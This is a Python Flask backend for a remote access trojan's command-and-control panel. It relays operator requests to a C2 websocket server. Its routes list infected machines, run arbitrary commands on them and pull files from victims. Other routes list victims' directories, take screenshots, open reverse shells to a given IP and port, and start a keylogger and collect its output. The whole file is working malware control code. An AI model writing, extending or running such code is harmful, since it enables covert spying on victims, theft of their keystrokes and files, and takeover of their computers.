from flask import Flask, jsonify, request, Response
from flask_cors import CORS
# import time

import lib.socket_v1


SOCKETURL = "ws://c2server:9002"
# SOCKETURL = "wss://ws2.hqnw.live"

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

# Basic route
@app.route('/')
def home():
  return jsonify({"message": "Backend server is running"})


@app.route('/GetRatsIds', methods=['GET'])
def GetRatsIds():
  c2 = lib.socket_v1.C2_API(SOCKETURL)
  response = c2.GetAllRatsIds()
  return jsonify(response)

@app.route('/GetRatsInfo', methods=['GET'])
def GetRatsInfo():
  data = request.json
  c2 = lib.socket_v1.C2_API(SOCKETURL)
  
  response = c2.GetRatsInfo(data['ids'])["Success"]
  # response = [{key: str(value) for key, value in rat.items()} for rat in response["RatsMetaData"]]

  return jsonify(response)

@app.route('/GetAllRatInfo', methods=['GET'])
def GetAllRatInfo():
  c2 = lib.socket_v1.C2_API(SOCKETURL)
  response = c2.GetRatsInfo(c2.GetAllRatsIds()["Rats"])["Success"]
  # response = [{key: str(value) for key, value in rat.items()} for rat in response["RatsMetaData"]]
  # response = [{key: (value if key not in ['ip', 'location', 'user'] else value.ljust(20)) for key, value in rat.items()} for rat in response]
  # response = [{key: (value if key not in ['id'] else value.ljust(len(rat["user"]))) for key, value in rat.items()} for rat in response]
  
  return jsonify(response)

@app.route('/OnlineStatus/<id>', methods=['GET'])
def OnlineStatus(id):
  c2 = lib.socket_v1.C2_API(SOCKETURL)
  response = int(id) in c2.GetAllRatsIds()["Rats"]
  response = {"status": response}
  if id == 1210506881:
    response["status"] = False
  return jsonify(response)

@app.route('/ExecuteCommand', methods=['POST'])
def ExecuteCommand():
  data = request.json
  c2 = lib.socket_v1.C2_API(SOCKETURL)
  command = data['command']


  match command:
    case "quit":
      response = "Failed"
      return jsonify(response)
    case "poweroff":
      response = "Failed"
      return jsonify(response)
    case "reboot":
      response = "Failed"
      return jsonify(response)
    case "shutdown":
      response = "Failed"
      return jsonify(response)
    case "halt":
      response = "Failed"
      return jsonify(response)
    case "init 0":
      response = "Failed"
      return jsonify(response)

  
  response = c2.execute_command(data['ratId'], data['command'])
  return jsonify(response)

@app.route('/RequestFile', methods=['POST'])
def RequestFile():
  data = request.json
  c2 = lib.socket_v1.C2_API(SOCKETURL)

  response = c2.request_file(data['ratId'], data['filePath'])
  print(response)
  return jsonify(response)

@app.route('/GetDownloadedFiles/<ratId>', methods=['GET'])
def GetDownloadedFiles(ratId):
  c2 = lib.socket_v1.C2_API(SOCKETURL)
  
  response = c2.get_all_downloaded_files(int(ratId))
  return jsonify(response)

@app.route('/GetFileDownloadStatus', methods=['GET'])
def GetFileDownloadStatus():
  data = request.json
  c2 = lib.socket_v1.C2_API(SOCKETURL)
  
  response = c2.get_file_download_status(data['ratId'], data['downloadId'])
  return jsonify(response)

@app.route('/DownloadFile/<ratId>/<downloadId>', methods=['GET'])
def DownloadFile(ratId: str, downloadId: str):
  c2 = lib.socket_v1.C2_API(SOCKETURL)
  print(ratId, downloadId)
  result = c2.download_file(ratId, downloadId)
  
  if result is None:
    return jsonify({"error": "File not found"}), 404
  
  file_content, filename, extention = result
  
  response = Response(file_content)
  response.headers['Content-Disposition'] = f'attachment; filename="{filename}"'
  response.headers['Extention'] = extention
  response.headers['Content-Type'] = 'application/octet-stream'
  response.headers['Content-Length'] = str(len(file_content))
  return response

@app.route('/ListDirTree', methods=['POST'])
def ListDirTree():
  data = request.json
  c2 = lib.socket_v1.C2_API(SOCKETURL)
  
  response = c2.list_file_tree(data['ratId'], data['Path'], data['depth'])
  return jsonify(response)

@app.route('/TakeScreenshot/<id>', methods=['GET'])
def TakeScreenshot(id):
  c2 = lib.socket_v1.C2_API(SOCKETURL)
  
  response = c2.take_screenshot(int(id))
  return jsonify(response)

@app.route('/OpenReverseShell', methods=['POST'])
def OpenReverseShell():
  data = request.json
  c2 = lib.socket_v1.C2_API(SOCKETURL)
  
  response = c2.open_reverse_shell(data['ratId'], data['ip'], data['port'])
  return jsonify(response)

@app.route('/keylogger', methods=['POST'])
def keylogger():
  data = request.json
  c2 = lib.socket_v1.C2_API(SOCKETURL)

  if data['command'] == "stop":
    response = c2.stop_keylogger(data['ratId'])
    return jsonify(response)
  if data['command'] == "start":
    response = c2.start_keylogger(data['ratId'])
    return jsonify(response)
  if data['command'] == "get_data":
    response = c2.get_keylogger_data(data['ratId'])
    return jsonify(response)
  if data['command'] == "get_status": 
    response = c2.get_keylogger_status(data['ratId'])
    return jsonify(response)

  else:
    return jsonify({"error": "Invalid command"}), 400

if __name__ == '__main__':
  app.run(debug=True, host='0.0.0.0', port=5000)

# routes
# GET /GetRatsIds -> GetRatsIds
# GET /GetRatsInfo -> GetRatsInfo
# GET /GetAllRatInfo -> GetAllRatInfo
# GET /OnlineStatus/<id> -> OnlineStatus
# POST /ExecuteCommand -> ExecuteCommand
# POST /RequestFile -> RequestFile
# GET /ListDirTree -> ListDirTree

